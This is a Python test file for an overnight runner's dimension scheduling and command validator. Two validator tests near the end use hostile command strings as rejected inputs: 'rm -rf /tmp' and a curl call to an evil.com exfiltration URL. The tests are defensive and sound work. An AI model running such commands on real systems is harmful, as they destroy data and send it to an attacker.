"""Tests for overnight_runner.py -- next_dimension, dimensions_to_run, validate_command."""

from tools.scripts.overnight_runner import (
    DIMENSION_ORDER,
    next_dimension,
    dimensions_to_run,
    validate_command,
)


# --- next_dimension ---

def test_next_dimension_no_state():
    assert next_dimension({}) == DIMENSION_ORDER[0]


def test_next_dimension_after_first():
    state = {"last_dimension": DIMENSION_ORDER[0]}
    assert next_dimension(state) == DIMENSION_ORDER[1]


def test_next_dimension_wraps_around():
    state = {"last_dimension": DIMENSION_ORDER[-1]}
    assert next_dimension(state) == DIMENSION_ORDER[0]


def test_next_dimension_force_valid():
    state = {"last_dimension": DIMENSION_ORDER[0]}
    assert next_dimension(state, force="codebase_health") == "codebase_health"


def test_next_dimension_force_invalid_ignored():
    state = {"last_dimension": DIMENSION_ORDER[0]}
    # Invalid force falls through to normal logic
    result = next_dimension(state, force="nonexistent")
    assert result == DIMENSION_ORDER[1]


def test_next_dimension_unknown_last():
    state = {"last_dimension": "unknown"}
    assert next_dimension(state) == DIMENSION_ORDER[0]


# --- dimensions_to_run ---

def _all_enabled():
    return {d: {"enabled": True} for d in DIMENSION_ORDER}


def test_dimensions_to_run_all_enabled():
    result = dimensions_to_run({}, _all_enabled())
    assert set(result) == set(DIMENSION_ORDER)


def test_dimensions_to_run_force():
    result = dimensions_to_run({}, _all_enabled(), force="codebase_health")
    assert result == ["codebase_health"]


def test_dimensions_to_run_force_disabled_returns_empty():
    dims = _all_enabled()
    dims["codebase_health"]["enabled"] = False
    result = dimensions_to_run({}, dims, force="codebase_health")
    assert result == []


def test_dimensions_to_run_skips_disabled():
    dims = _all_enabled()
    dims["scaffolding"]["enabled"] = False
    result = dimensions_to_run({}, dims)
    assert "scaffolding" not in result


def test_dimensions_to_run_skips_missing():
    # Only one dimension configured
    dims = {"codebase_health": {"enabled": True}}
    result = dimensions_to_run({}, dims)
    assert result == ["codebase_health"]


# --- validate_command ---

def test_validate_command_empty():
    assert validate_command("", "metric_command") is True


def test_validate_command_none_placeholder():
    assert validate_command("(none)", "guard_command") is True


def test_validate_command_pytest():
    assert validate_command("python -m pytest tests/ --tb=no -q", "metric_command") is True


def test_validate_command_flake8():
    assert validate_command("python -m flake8 --count tools/", "guard_command") is True


def test_validate_command_grep():
    assert validate_command("grep -c 'pattern' file.py", "metric_command") is True


def test_validate_command_blocked_rm():
    assert validate_command("rm -rf /tmp", "guard_command") is False


def test_validate_command_blocked_curl():
    assert validate_command("curl http://evil.com/exfil", "metric_command") is False


def test_validate_command_strips_backticks():
    assert validate_command("`python -m pytest tests/`", "metric_command") is True
